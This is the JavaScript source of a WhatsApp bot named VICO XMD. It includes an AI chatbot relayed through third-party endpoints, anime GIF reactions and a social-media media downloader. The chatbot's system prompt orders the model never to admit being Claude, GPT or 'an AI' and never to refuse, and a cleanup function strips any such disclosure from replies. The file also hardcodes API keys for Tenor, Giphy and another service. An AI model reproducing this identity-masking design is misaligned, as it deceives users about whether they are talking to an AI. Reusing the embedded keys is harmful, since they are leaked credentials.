

require('../config/setting/config');
const {
    default: baileys,
    getContentType,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");

const fs = require('fs');
const path = require('path');
let axios; try { axios = require('axios'); } catch (_) { axios = null; }
let chalk; try { chalk = require('chalk'); } catch (_) {
  chalk = { red: s=>s, green: s=>s, blue: s=>s, yellow: s=>s, cyan: s=>s, white: s=>s, bold: { white: s=>s } };
  chalk.bold = chalk.bold || { white: s=>s };
}
let moment; try { moment = require('moment-timezone'); } catch (_) {
  moment = () => ({ tz: () => ({ format: (f) => new Date().toISOString() }) });
  moment.tz = () => ({ format: (f) => new Date().toISOString() });
}
let getSetting, setSetting;
try {
  ({ getSetting, setSetting } = require("../config/setting/Settings.js"));
} catch (_) {
  getSetting = (a,b,c) => c;
  setSetting = () => {};
}
let toAudio, toPTT;
try { ({ toAudio, toPTT } = require('../lib/converter.js')); } catch (_) {
  toAudio = async (b) => b; toPTT = async (b) => b;
}
let addExif;
try { ({ addExif } = require('../utils/exif.js')); } catch (_) { addExif = async (b) => b; }
let yts; try { yts = require('yt-search'); } catch (_) { yts = async () => ({ videos: [] }); }
// Lazy-load pair to avoid circular require (pair.js requires case.js)
let startpairing = null;
function getStartPairing() {
    if (!startpairing) startpairing = require('./pair');
    return startpairing;
}
let APIs; try { APIs = require('./api'); } catch (_) { APIs = {}; }
let executeRichGame;
try { ({ executeRichGame } = require('../commands/richgames')); } catch (_) {
  executeRichGame = async () => false;
}
let runCustomCommand, listCustomCommands;
try {
  ({ runCommand: runCustomCommand, listCommands: listCustomCommands } = require('../lib/commandLoader'));
} catch (_) {
  runCustomCommand = async () => false;
  listCustomCommands = () => [];
}
let STORAGE_DIR, DATABASE_FILE;
try {
  ({ STORAGE_DIR, DATABASE_FILE } = require('../lib/paths'));
} catch (_) {
  const path = require('path');
  STORAGE_DIR = path.join(process.cwd(), 'storage');
  DATABASE_FILE = path.join(STORAGE_DIR, 'database.json');
}
let getSenderIds, sameIdentity, isGroupAdmin;
try {
  ({ getSenderIds, sameIdentity, isGroupAdmin } = require('../lib/identity'));
} catch (_) {
  getSenderIds = (m) => [m?.sender, m?.key?.participant, m?.key?.remoteJid].filter(Boolean);
  sameIdentity = (a, b) => String(a||'').split('@')[0].split(':')[0] === String(b||'').split('@')[0].split(':')[0];
  isGroupAdmin = () => false;
}

// ========== GLOBALS ==========
global.packname = '𝐕𝐈𝐂𝐎 𝐗𝐌𝐃';
global.OWNER_NAME = '𝐌𝐑 𝐑𝐌𝐒 𓉳';
global.botName = '𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳';
global.creator = '2348122766645@s.whatsapp.net';
global.owner = ['2348122766645@s.whatsapp.net'];

// ========== NEWSLETTER CONTEXT ==========
global.newsletterJid = '120363424620719844@newsletter';
global.newsletterName = '𝐑𝐌𝐒 𝐓𝐄𝐂𝐇 𓉳';

// ========== NEWSLETTER CONTEXT FUNCTION ==========
function plainCtx(extra = {}) {
    // No newsletter / forwarded look
    return extra || {};
}
function newsletterContext(extra = {}) {
    // No forwarded/newsletter tag on replies
    return extra || {};
}

// ========== CHATBOT (memory + multi-API) ==========
if (!global.chatbotRooms) global.chatbotRooms = {};
if (!global.chatbotMemory) global.chatbotMemory = {}; // jid -> [{role,content}]


// ========== VV4: any reaction on view-once → open in reactor DM ==========
async function handleVv4Reaction(empire, m) { return false; }

async function chatbotReply(empire, m) {
    try {
        if (!m?.message || m.key?.fromMe) return false;
        if (m.message?.protocolMessage) return false;
        if (m.key?.remoteJid === 'status@broadcast') return false;
        const chatId = m.chat || m.key?.remoteJid;
        if (!chatId || !global.chatbotRooms || !global.chatbotRooms[chatId]) return false;

        const body = (
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            m.message?.imageMessage?.caption ||
            m.message?.videoMessage?.caption ||
            m.message?.buttonsResponseMessage?.selectedDisplayText ||
            m.message?.listResponseMessage?.title ||
            m.text ||
            ''
        ).trim();
        if (!body) return false;
        if (/^[.\/#!]/.test(body)) return false;

        if (!global.chatbotMemory) global.chatbotMemory = {};
        if (!global.chatbotMemory[chatId]) global.chatbotMemory[chatId] = [];
        const mem = global.chatbotMemory[chatId];
        mem.push({ role: 'user', content: body });
        if (mem.length > 8) mem.splice(0, mem.length - 8);

        const low = body.toLowerCase().replace(/\s+/g, ' ').trim();

        // ── Instant slang / greeting matches (super fast, no API) ──
        function localReply(text) {
            const t = text.toLowerCase().trim();

            // Acknowledgments / short vibes
            if (/^(ok|okay|k|kk|alright|ight|aight)\b/.test(t)) {
                const a = ['Alright mate 👍', 'Ok gee', 'Sharp ⚡', 'No wahala', 'Cool beans', 'Bet.'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/^(oya|oya na|oya nah)\b/.test(t)) {
                const a = ['Everywhere good 😊', 'I dey kampe', 'We move ⚡', 'No dulling', 'Oya na, I dey ready'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/^(omo|abeg|abeg o|please|pls)\b/.test(t) || t === 'omo') {
                const a = ['Omo I dey hear you 👀', 'Abeg talk, I dey listen', 'Omo wetin happen?', 'Spill am', 'I dey here o'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/^(hi|hii+|hello|hey|yo|sup|gm|ga|ge|good morning|good afternoon|good evening)\b/.test(t)) {
                const a = ['Hello! How far? 👋', 'Heyy! How you dey?', 'Hi o! Wetin dey happen?', 'Yo! I dey here ⚡', 'Good one — talk to me'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/how (are you|r u|far|e dey|you dey)|howfar|how e dey|wetin dey|you good|u good/.test(t)) {
                const a = ['I dey kampe 🔥 You nko?', 'Everywhere good 😊 You?', 'All good o! How you dey?', 'Sharp sharp — you nko?'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/^(sharp|no wahala|np|cool|nice|fine|correct|e choke)\b/.test(t)) {
                const a = ['Sharp 👍', 'No wahala', 'E choke 🔥', 'Correct', 'We good'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/thank|thanks|ty|thx|appreciate/.test(t)) {
                const a = ['You welcome! 💫', 'Anytime o', 'No problem at all', 'My pleasure ⚡', 'Na small thing'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/^(bye|goodbye|see you|later|night|gn|i go)\b/.test(t)) {
                const a = ['Later! 👋', 'Bye bye, take care', 'See you soon ⚡', 'Good night o', 'We go yarn'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/who (are you|r u)|your name|wetin be your name/.test(t)) {
                return 'I be VICO AI — chatbot for VICO XMD. Ask me anything for real ⚡';
            }
            if (/^lol+$|^lmao+$|^haha+|😂|🤣/.test(t)) {
                const a = ['😂😂', 'You funny sha', 'Haha I feel you', '🤣 facts', 'E too funny'];
                return a[Math.floor(Math.random() * a.length)];
            }
            if (/love you|i like you/.test(t)) {
                return 'Aww 😊 Respect. How I fit help you?';
            }
            if (/^(hmm+|hmmm+|eh+|ehe|ah+|oh+)\b/.test(t)) {
                const a = ['I dey hear you…', 'Continue 👀', 'Talk am', 'Hmm I dey listen'];
                return a[Math.floor(Math.random() * a.length)];
            }
            return null;
        }

        const instant = localReply(low);
        if (instant) {
            mem.push({ role: 'assistant', content: instant });
            if (mem.length > 8) mem.splice(0, mem.length - 8);
            await empire.sendMessage(chatId, { text: instant }, { quoted: m });
            return true;
        }

        // ── 50 contextual slang fallbacks (used only ~30% when APIs fail) ──
        const SLANG_POOL = [
            'Oya na ⚡',
            'Ok gee',
            'Everywhere good 😊',
            'I dey hear you',
            'No wahala',
            'Sharp sharp',
            'We move',
            'E choke 🔥',
            'Correct',
            'Alright mate 👍',
            'I feel you',
            'Facts',
            'Bet.',
            'Cool beans',
            'Na so',
            'I dey kampe',
            'Abeg hold on small',
            'Hmm interesting',
            'Talk true',
            'You too much',
            'God abeg 😅',
            'E hard sha',
            'I dey with you',
            'No dulling',
            'We go yarn',
            'Carry go',
            'As e be',
            'E remain small',
            'I catch am',
            'Noted ⚡',
            'Respect',
            'You try',
            'E sweet',
            'No stress',
            'Take am easy',
            'I dey ready',
            'Spill am',
            'Omo…',
            'Wetin you think?',
            'Make we see',
            'E go better',
            'Hold am tight',
            'Na vibes',
            'Soft life loading 😊',
            'I hear you loud',
            'Keep am moving',
            'You dey try',
            'E no easy but we dey',
            'Bless up',
            'Stay solid 💪'
        ];

        function slangFor(input) {
            const t = input.toLowerCase();
            if (/ok|okay|alright|aight/.test(t)) return ['Alright mate 👍', 'Ok gee', 'Sharp ⚡', 'No wahala'][Math.floor(Math.random() * 4)];
            if (/oya/.test(t)) return ['Everywhere good 😊', 'Oya na ⚡', 'We move', 'I dey ready'][Math.floor(Math.random() * 4)];
            if (/omo|abeg/.test(t)) return ['Omo…', 'I dey hear you', 'Spill am', 'Abeg hold on small'][Math.floor(Math.random() * 4)];
            if (/hard|wahala|stress|tired/.test(t)) return ['E hard sha', 'Take am easy', 'No stress', 'E no easy but we dey'][Math.floor(Math.random() * 4)];
            if (/lol|haha|funny|😂/.test(t)) return ['😂😂', 'You funny sha', 'E sweet', 'Facts'][Math.floor(Math.random() * 4)];
            if (/thank|ty|thx/.test(t)) return ['You welcome!', 'Anytime o', 'Na small thing', 'Bless up'][Math.floor(Math.random() * 4)];
            // random from full pool
            return SLANG_POOL[Math.floor(Math.random() * SLANG_POOL.length)];
        }

        const history = mem.slice(-5).map(x => x.role + ': ' + x.content).join('\n');
        const system =
            'You are VICO AI, official AI of VICO XMD by MR RMS. ' +
            'Answer ANY question in the world fully and correctly: science, geography, history, math, tech, sports, culture, definitions, how-to, Nigeria, pidgin — everything. ' +
            'Be cool, clear, useful. Prefer short WhatsApp-style answers (2-5 sentences) unless the topic needs more detail. ' +
            'If the user writes Nigerian pidgin, reply in simple natural pidgin with slang (oya na, no wahala, how e dey, etc). ' +
            'If English, reply English (can still use light cool tone). ' +
            'Never say you are Claude, Anthropic, GPT, OpenAI, Gemini, or "as an AI". Never refuse normal knowledge questions. Name is VICO AI only.';

        const prompt = system + '\n\n' + history + '\nAssistant:';

        function cleanAnswer(raw) {
            if (raw == null) return null;
            let s = String(raw).trim();
            if (!s) return null;
            s = s.replace(/\b(claude|anthropic|openai|chatgpt|gpt-?\d*|gemini|bard|as an ai language model)\b/gi, '');
            s = s.replace(/\bI(?:'m| am) (?:an? )?(?:AI|artificial intelligence|language model)[^.!?\n]*/gi, '');
            s = s.replace(/\s{2,}/g, ' ').trim();
            // allow longer for real knowledge answers
            if (s.length > 1200) s = s.slice(0, 1200).replace(/\s+\S*$/, '') + '…';
            // reject empty / pure filler
            if (/^(say more|i wan understand|tell me more|break am down|continue)\b/i.test(s) && s.length < 40) return null;
            return s.length >= 2 ? s : null;
        }

        let answer = null;
        if (axios) {
            const makeTry = (fn) => new Promise((resolve) => {
                (async () => {
                    try { resolve(cleanAnswer(await fn())); }
                    catch (_) { resolve(null); }
                })();
            });

            // Prefer knowledge-capable endpoints + fuller prompt
            const jobs = [
                makeTry(async () => {
                    const { data } = await axios.get('https://text.pollinations.ai/' + encodeURIComponent(prompt), {
                        timeout: 12000, responseType: 'text'
                    });
                    return typeof data === 'string' ? data : null;
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://api.siputzx.my.id/api/ai/gpt', {
                        params: { q: body, prompt }, timeout: 12000
                    });
                    return data?.data || data?.result || data?.response || data?.answer || null;
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://apis.davidcyril.name.ng/ai/gpt', {
                        params: { q: prompt, text: body }, timeout: 14000
                    });
                    return data?.result || data?.response || data?.data || data?.answer || data?.message || (typeof data === 'string' ? data : null);
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://apis.davidcyril.name.ng/ai/gemini', {
                        params: { q: prompt, text: body }, timeout: 14000
                    });
                    return data?.result || data?.response || data?.data || data?.answer || data?.message || null;
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://omegatech-api.dixonomega.tech/api/ai/Chatbot', {
                        params: { message: body, q: body, text: body, prompt }, timeout: 12000
                    });
                    return data?.result || data?.response || data?.data || data?.answer || data?.message || data?.reply || null;
                }),
                makeTry(async () => {
                    const { data } = await axios.post('https://omegatech-api.dixonomega.tech/api/ai/Chatbot', {
                        message: body, query: body, text: body, prompt, system
                    }, { timeout: 12000, headers: { 'Content-Type': 'application/json' } });
                    return data?.result || data?.response || data?.data || data?.answer || data?.message || data?.reply || null;
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://api.agatz.xyz/api/gpt', {
                        params: { message: prompt }, timeout: 12000
                    });
                    return data?.data || data?.result || data?.response || data?.message || null;
                }),
                makeTry(async () => {
                    const { data } = await axios.get('https://apis.davidcyril.name.ng/ai/claude-sonnet-4.6', {
                        params: { q: prompt, text: body }, timeout: 16000
                    });
                    return data?.result || data?.response || data?.data || data?.answer || data?.message || (typeof data === 'string' ? data : null);
                })
            ];

            answer = await Promise.race([
                new Promise((resolve) => {
                    let left = jobs.length;
                    for (const j of jobs) {
                        j.then((v) => {
                            if (v) resolve(v);
                            else if (--left === 0) resolve(null);
                        });
                    }
                }),
                new Promise((resolve) => setTimeout(() => resolve(null), 15000))
            ]);
        }

        // If APIs failed: 70% silent, 30% contextual slang (never "say more / understand well")
        if (!answer) {
            if (Math.random() < 0.70) return true; // silent
            answer = slangFor(body);
        }

        mem.push({ role: 'assistant', content: answer });
        if (mem.length > 8) mem.splice(0, mem.length - 8);
        await empire.sendMessage(chatId, { text: answer }, { quoted: m });
        return true;
    } catch (e) {
        console.error('chatbot:', e.message);
        // silent on hard error
        return true;
    }
}

function getFfmpegBin() {
    try {
        return require('@ffmpeg-installer/ffmpeg').path;
    } catch (_) {}
    try {
        return require('ffmpeg-static');
    } catch (_) {}
    return 'ffmpeg';
}

async function convertToWhatsAppGifMp4(inputBuf, extHint) {
    const fs = require('fs');
    const os = require('os');
    const path = require('path');
    const { execFile } = require('child_process');
    const { promisify } = require('util');
    const execFileAsync = promisify(execFile);
    const bin = getFfmpegBin();
    const id = 'vico_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
    const tmp = os.tmpdir();
    const ext = extHint || '.gif';
    const inF = path.join(tmp, id + ext);
    const outF = path.join(tmp, id + '.mp4');
    fs.writeFileSync(inF, inputBuf);
    try {
        await execFileAsync(bin, [
            '-y', '-i', inF,
            '-movflags', '+faststart',
            '-pix_fmt', 'yuv420p',
            '-vf', 'scale=trunc(iw/2)*2:trunc(ih/2)*2',
            '-c:v', 'libx264',
            '-preset', 'ultrafast',
            '-crf', '28',
            '-an',
            '-t', '15',
            outF
        ], { timeout: 45000, maxBuffer: 15 * 1024 * 1024 });
        if (fs.existsSync(outF) && fs.statSync(outF).size > 400) {
            return fs.readFileSync(outF);
        }
        throw new Error('empty output');
    } finally {
        try { fs.unlinkSync(inF); } catch (_) {}
        try { fs.unlinkSync(outF); } catch (_) {}
    }
}

async function sendNekosBestReaction(empire, m, command, prefix, args) {
    const map = {
        hug:'hug', slap:'slap', kiss:'kiss', cry:'cry', dance:'dance', pat:'pat', poke:'poke',
        cuddle:'cuddle', bite:'bite', bonk:'bonk', wink:'wink', smile:'smile', wave:'wave',
        highfive:'highfive', feed:'feed', tickle:'tickle', blush:'blush', smug:'smug',
        shrug:'shrug', stare:'stare', confused:'shrug', think:'think', yawn:'sleep',
        sleep:'sleep', clap:'clap', shoot:'shoot', lurk:'lurk', peck:'kiss', sip:'sip',
        yeet:'yeet', wag:'wag', teehee:'smile', shocked:'shocked', bleh:'bleh', bored:'bored',
        nom:'nom', nya:'neko', facepalm:'facepalm', happy:'happy', carry:'handhold',
        kabedon:'punch', baka:'baka', angry:'angry', spin:'dance', shake:'shake', run:'run',
        nod:'nod', nope:'nope', punch:'punch', handshake:'handshake', pout:'pout'
    };
    const cat = map[String(command||'').toLowerCase()] || String(command||'hug').toLowerCase();
    const verbs = {
        hug:['hugs','wants a hug'], slap:['slaps','slaps the air'], kiss:['kisses','blows a kiss'],
        cry:['cries with','is crying'], dance:['dances with','is dancing'], pat:['pats','pats themselves'],
        poke:['pokes','pokes the void'], cuddle:['cuddles','needs a cuddle'], bite:['bites','bites playfully'],
        bonk:['bonks','bonks themselves'], wink:['winks at','winks'], smile:['smiles at','smiles'],
        wave:['waves at','waves'], highfive:['high-fives','high-fives the air'], feed:['feeds','is hungry'],
        tickle:['tickles','giggles'], blush:['makes blush','is blushing'], punch:['punches','shadowboxes'],
        handshake:['shakes hands with','offers a handshake'], pout:['pouts at','is pouting']
    };
    const [verb, selfVerb] = verbs[cat] || [cat + 's', 'does ' + cat];
    const emoji = '✨';
    return sendGifReaction(empire, m, cat, emoji, verb, selfVerb);
}

async function sendGifReaction(empire, m, category, emoji, verb, selfVerb) {
    try {
        if (!axios) {
            return empire.sendMessage(m.chat, { text: '❌ axios missing' }, { quoted: m });
        }
        const sender = m.sender;
        const ctx = m.message?.extendedTextMessage?.contextInfo || {};
        const mentioned = ctx.mentionedJid || m.mentionedJid || [];
        const quoted = ctx.participant || m.quoted?.sender;
        let targetJid = mentioned[0] || quoted || null;
        let caption, mentions = [sender].filter(Boolean);
        const argsLocal = (typeof args !== 'undefined' && Array.isArray(args)) ? args : [];
        if (targetJid) {
            caption = emoji + ' *@' + String(sender).split('@')[0] + '* ' + verb + ' *@' + String(targetJid).split('@')[0] + '*!';
            mentions.push(targetJid);
        } else if (argsLocal.length) {
            caption = emoji + ' *@' + String(sender).split('@')[0] + '* ' + verb + ' *' + argsLocal.join(' ') + '*!';
        } else {
            caption = emoji + ' *@' + String(sender).split('@')[0] + '* ' + (selfVerb || verb) + '!';
        }

        const cat = String(category || 'hug').toLowerCase();
        const urls = []; // ordered preference

        // 1) nekos.best (anime reaction GIFs)
        try {
            const { data } = await axios.get('https://nekos.best/api/v2/' + encodeURIComponent(cat), {
                timeout: 15000, headers: { Accept: 'application/json', 'User-Agent': 'VICO-XMD/1.0' }
            });
            const u = data?.results?.[0]?.url;
            if (u) urls.push(u);
        } catch (_) {}

        // 2) waifu.pics
        try {
            const { data } = await axios.get('https://api.waifu.pics/sfw/' + encodeURIComponent(cat), {
                timeout: 15000, headers: { Accept: 'application/json' }
            });
            if (data?.url) urls.push(data.url);
        } catch (_) {}

        // 3) otakugifs
        try {
            const { data } = await axios.get('https://api.otakugifs.xyz/gif', {
                params: { reaction: cat }, timeout: 12000
            });
            if (data?.url) urls.push(data.url);
        } catch (_) {}

        // 4) Tenor native MP4 (already WhatsApp-ready)
        try {
            const { data } = await axios.get('https://tenor.googleapis.com/v2/search', {
                params: {
                    q: cat + ' anime',
                    key: process.env.TENOR_API_KEY || 'AIzaSyAyimkuZQVEp2CQ5ODtYABxQvF9nvuXo0E',
                    client_key: 'vico_xmd', limit: 8, media_filter: 'mp4'
                }, timeout: 14000
            });
            for (const r of (data?.results || [])) {
                const u = r.media_formats?.mp4?.url || r.media_formats?.tinymp4?.url;
                if (u) urls.push(u);
            }
        } catch (_) {}

        // 5) Giphy MP4
        try {
            const { data } = await axios.get('https://api.giphy.com/v1/gifs/search', {
                params: {
                    api_key: process.env.GIPHY_API_KEY || 'sCdSPUVlue8LbatazNvXgEh0FUwCWqr',
                    q: cat + ' anime reaction', limit: 6, rating: 'pg-13'
                }, timeout: 14000
            });
            for (const g of (data?.data || [])) {
                const u = g.images?.original?.mp4 || g.images?.fixed_height?.mp4;
                if (u) urls.push(u);
            }
        } catch (_) {}

        if (!urls.length) {
            return empire.sendMessage(m.chat, {
                text: caption + '\n\n_⚠️ Reaction APIs busy — try again_',
                mentions
            }, { quoted: m });
        }

        let lastErr = null;
        for (const url of urls.slice(0, 8)) {
            try {
                const media = await axios.get(url, {
                    responseType: 'arraybuffer', timeout: 40000,
                    headers: { Accept: '*/*', 'User-Agent': 'Mozilla/5.0' },
                    maxContentLength: 15 * 1024 * 1024,
                    validateStatus: s => s < 500, maxRedirects: 5
                });
                let buf = Buffer.from(media.data || []);
                if (buf.length < 400) continue;

                const ctype = String(media.headers['content-type'] || '');
                let isMp4 = /mp4|video/i.test(ctype) || /\.mp4(\?|$)/i.test(url) ||
                    (buf.length > 12 && buf.toString('utf8', 4, 8) === 'ftyp');
                const isGif = /gif/i.test(ctype) || /\.gif(\?|$)/i.test(url) ||
                    (buf[0] === 0x47 && buf[1] === 0x49 && buf[2] === 0x46);
                const isWebp = /webp/i.test(ctype) || /\.webp(\?|$)/i.test(url) ||
                    (buf.length > 12 && buf.slice(8, 12).toString() === 'WEBP');

                // GIF/WebP → convert to H.264 MP4 (WhatsApp gifPlayback needs this)
                if (!isMp4 && (isGif || isWebp)) {
                    try {
                        buf = await convertToWhatsAppGifMp4(buf, isGif ? '.gif' : '.webp');
                        isMp4 = true;
                    } catch (convErr) {
                        lastErr = convErr;
                        console.error('react convert:', convErr.message);
                        continue; // try next url
                    }
                }

                if (!isMp4) {
                    // try convert anyway
                    try {
                        buf = await convertToWhatsAppGifMp4(buf, '.bin');
                        isMp4 = true;
                    } catch (e2) {
                        lastErr = e2;
                        continue;
                    }
                }

                await empire.sendMessage(m.chat, {
                    video: buf,
                    mimetype: 'video/mp4',
                    gifPlayback: true,
                    caption,
                    mentions
                }, { quoted: m });
                return;
            } catch (e) {
                lastErr = e;
            }
        }

        const hint = (lastErr && /ffmpeg|ENOENT|not found/i.test(String(lastErr.message || lastErr)))
            ? '\n\n_Install on host:_\n`npm i @ffmpeg-installer/ffmpeg`'
            : (lastErr ? '\n' + (lastErr.message || '') : '');
        await empire.sendMessage(m.chat, {
            text: caption + '\n\n_⚠️ Could not build playable GIF_' + hint,
            mentions
        }, { quoted: m });
    } catch (e) {
        console.error('gif react', e.message);
        try {
            await empire.sendMessage(m.chat, { text: '❌ Reaction failed: ' + (e.message || 'error') }, { quoted: m });
        } catch (_) {}
    }
}

// ========== AUTO REACT ==========
let autoMessageReact = false;
const processedMessages = new Set();
const miniGameState = new Map();
// Auto-cleanup to prevent memory leak (fixes leak)
setInterval(() => { if (processedMessages.size > 5000) processedMessages.clear(); }, 1000*60*30);
setInterval(() => { if (miniGameState.size > 1000) { const now = Date.now(); for (const [k,v] of miniGameState) { if (now - (v.lastActive||0) > 1000*60*30) miniGameState.delete(k); } } }, 1000*60*10);



// Universal media resolver — multi API (fixes 403/404)
async function vicoResolveMedia(targetUrl, password) {
    let clean = String(targetUrl || '').trim().replace(/^http:\/\//i, 'https://');
    if (!/^https?:\/\//i.test(clean)) throw new Error('Invalid URL');
    const ZUKO_BASE = 'https://web-production-78afd6.up.railway.app';
    const ZUKO_KEY = 'zuko_VCmdU6W8SPOt4_gk1hE2dt7qqz2ajatO';
    const isIG = /instagram\.com|instagr\.am/i.test(clean);
    const isSnap = /snapchat\.com|snap\.com/i.test(clean);
    const isTT = /tiktok\.com|vt\.tiktok|vm\.tiktok/i.test(clean);
    const isFB = /facebook\.com|fb\.watch|fb\.com/i.test(clean);
    const isX = /twitter\.com|x\.com\/\w+\/status/i.test(clean);
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
    };

    function pickUrl(d) {
        if (!d) return null;
        if (typeof d === 'string' && /^https?:\/\//i.test(d)) return d;
        const keys = ['hdVideoUrl','videoUrl','video','hd','nowm','no_watermark','play','download','url','media','dl','link','mp4','video_url','download_url'];
        for (const k of keys) {
            if (typeof d[k] === 'string' && /^https?:\/\//i.test(d[k])) return d[k];
        }
        if (Array.isArray(d.formats)) {
            const f = d.formats.find(x => x.type === 'video' && !x.hasWatermark) || d.formats.find(x => x.type === 'video') || d.formats[0];
            if (f?.url) return f.url;
        }
        if (Array.isArray(d.media)) {
            const m = d.media[0];
            if (typeof m === 'string') return m;
            if (m?.url) return m.url;
        }
        if (Array.isArray(d.urls)) {
            const u = d.urls[0];
            return typeof u === 'string' ? u : u?.url;
        }
        if (d.links?.[0]?.url) return d.links[0].url;
        if (d.data && d.data !== d) return pickUrl(d.data);
        if (d.result && d.result !== d) return pickUrl(d.result);
        return null;
    }
    function pickImages(d) {
        if (!d) return [];
        if (Array.isArray(d.images)) return d.images.filter(x => typeof x === 'string' || x?.url).map(x => typeof x === 'string' ? x : x.url);
        if (Array.isArray(d.image)) return d.image.filter(Boolean);
        if (typeof d.image === 'string') return [d.image];
        if (d.type === 'image' && d.url) return [d.url];
        return [];
    }

    const tries = [];

    // ZUKO generic
    for (const path of ['/api/download', '/v1/download', '/api/aio', '/api/media']) {
        tries.push(async () => {
            const { data } = await axios.get(ZUKO_BASE + path, {
                params: { url: clean, apikey: ZUKO_KEY, key: ZUKO_KEY }, timeout: 50000, headers
            });
            return data;
        });
    }

    // Platform-specific free APIs
    if (isIG) {
        const igApis = [
            'https://api.siputzx.my.id/api/d/igdl?url=',
            'https://api.agatz.xyz/api/instagram?url=',
            'https://api.ryzendesu.vip/api/downloader/igdl?url=',
            'https://btch.us.kg/igdl?url=',
            'https://api.vreden.web.id/api/igdownload?url=',
        ];
        for (const base of igApis) {
            tries.push(async () => {
                const { data } = await axios.get(base + encodeURIComponent(clean), { timeout: 35000, headers });
                return data;
            });
        }
        tries.push(async () => {
            const { data } = await axios.get(ZUKO_BASE + '/api/ig', {
                params: { url: clean, apikey: ZUKO_KEY }, timeout: 50000, headers
            });
            return data;
        });
    }
    if (isSnap) {
        for (const path of ['/api/snap', '/api/snapchat', '/api/download']) {
            tries.push(async () => {
                const { data } = await axios.get(ZUKO_BASE + path, {
                    params: { url: clean, apikey: ZUKO_KEY }, timeout: 50000, headers
                });
                return data;
            });
        }
        tries.push(async () => {
            const { data } = await axios.get('https://api.siputzx.my.id/api/d/snapchat?url=' + encodeURIComponent(clean), { timeout: 35000, headers });
            return data;
        });
    }
    if (isTT) {
        tries.push(async () => {
            const { data } = await axios.get('https://tikwm.com/api/', { params: { url: clean }, timeout: 30000, headers });
            return data;
        });
        tries.push(async () => {
            const { data } = await axios.get('https://api.siputzx.my.id/api/d/tiktok?url=' + encodeURIComponent(clean), { timeout: 30000, headers });
            return data;
        });
        tries.push(async () => {
            const { data } = await axios.get('https://api.agatz.xyz/api/tiktok?url=' + encodeURIComponent(clean), { timeout: 30000, headers });
            return data;
        });
    }
    if (isFB) {
        tries.push(async () => {
            const { data } = await axios.get('https://api.siputzx.my.id/api/d/fbdl?url=' + encodeURIComponent(clean), { timeout: 35000, headers });
            return data;
        });
        tries.push(async () => {
            const { data } = await axios.get('https://api.agatz.xyz/api/facebook?url=' + encodeURIComponent(clean), { timeout: 35000, headers });
            return data;
        });
    }
    if (isX) {
        tries.push(async () => {
            const { data } = await axios.get('https://api.siputzx.my.id/api/d/twitter?url=' + encodeURIComponent(clean), { timeout: 35000, headers });
            return data;
        });
    }

    // Omnify
    tries.push(async () => {
        const { data } = await axios.post('https://api-aio.omnifylabs.sbs/api/v1/media/resolve',
            password ? { url: clean, password } : { url: clean },
            { timeout: 40000, headers: { ...headers, 'Content-Type': 'application/json',
                'Origin': 'https://aio.omnifylabs.sbs', 'Referer': 'https://aio.omnifylabs.sbs/' } });
        return data;
    });

    let lastErr = null;
    for (const fn of tries) {
        try {
            const raw = await fn();
            if (!raw) continue;
            const d = raw.data || raw.result || raw;
            let video = pickUrl(d);
            const images = pickImages(d);
            if (images.length && video && images.includes(video)) video = null;
            // snap/ig sometimes return only array under data
            if (!video && !images.length && Array.isArray(d)) {
                for (const item of d) {
                    const u = pickUrl(item);
                    if (u && /\.(mp4|mov|webm)/i.test(u)) { video = u; break; }
                    if (u && /\.(jpg|jpeg|png|webp)/i.test(u)) images.push(u);
                }
            }
            const audio = (typeof d.audioUrl === 'string' && d.audioUrl) || d.music || d.audio || null;
            const title = d.title || d.description || d.desc || d.caption || '';
            const author = d.author?.nickname || d.author || d.unique_id || d.username || '';
            if (video || images.length || audio) {
                return {
                    platform: isIG ? 'instagram' : isSnap ? 'snapchat' : isTT ? 'tiktok' : isFB ? 'facebook' : isX ? 'x' : (raw.platform || d.platform || 'media'),
                    video: typeof video === 'string' ? video : null,
                    images,
                    audio: typeof audio === 'string' ? audio : null,
                    title: String(title || '').slice(0, 200),
                    author: String(author || ''),
                    cover: d.cover || d.thumbnail || d.thumb || null
                };
            }
        } catch (e) {
            lastErr = e;
            const msg = String(e.message || e);
            if (/ENOTFOUND|ECONNREFUSED|getaddrinfo|403|503|502|429/i.test(msg)) continue;
        }
    }
    throw lastErr || new Error('All download APIs failed. Try another link or later.');
}

async function vicoSendResolved(empire, m, resolved) {
    const caption = '✅ *Downloaded*' +
        (resolved.author ? '\n👤 ' + resolved.author : '') +
        (resolved.title ? '\n📝 ' + resolved.title : '');
    if (resolved.video) {
        await empire.sendMessage(m.chat, { video: { url: resolved.video }, caption }, { quoted: m });
        return;
    }
    if (resolved.images && resolved.images.length) {
        for (let i = 0; i < resolved.images.length; i++) {
            await empire.sendMessage(m.chat, {
                image: { url: resolved.images[i] },
                caption: i === 0 ? caption : undefined
            }, { quoted: m });
        }
        return;
    }
    if (resolved.audio) {
        if (resolved.cover) {
            await empire.sendMessage(m.chat, { image: { url: resolved.cover }, caption }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
        await empire.sendMessage(m.chat, { audio: { url: resolved.audio }, mimetype: 'audio/mpeg' }, { quoted: m });
        return;
    }
    throw new Error('No media in response');
}


// Auto-cleanup to prevent memory leak (fixes leak)
setInterval(() => { if (processedMessages.size > 5000) processedMessages.clear(); }, 1000*60*30);
setInterval(() => { if (miniGameState.size > 1000) { const now = Date.now(); for (const [k,v] of miniGameState) { if (now - (v.lastActive||0) > 1000*60*30) miniGameState.delete(k); } } }, 1000*60*10);






